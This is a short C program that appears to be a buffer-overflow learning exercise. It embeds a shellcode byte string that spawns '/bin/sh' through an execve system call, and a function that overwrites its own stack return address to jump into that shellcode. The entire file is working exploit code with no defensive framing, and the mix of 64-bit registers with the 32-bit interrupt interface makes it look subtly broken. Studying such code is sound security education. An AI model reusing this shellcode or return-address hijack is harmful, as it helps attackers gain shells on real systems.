#include<stdio.h>

char *shellcode = "\xeb\x1c\x5e\x48\x31\xc0\x48\x89\xc1\x48\x89\xc2\x48\x89\xf3\xb0\x0b\xcd\x80\x48\x31\xdb\x48\x89\xd8\x48\xff\xc0\xcd\x80\xe8\xdf\xff\xff\xff/bin/sh";

void func() {
   long *ret;
   ret = (long)&ret + 16;
   (*ret) = (long)shellcode;

}

void main(){
	func();
	printf("in main after func\n");
	printf("skipped 1 instruction\n");
}
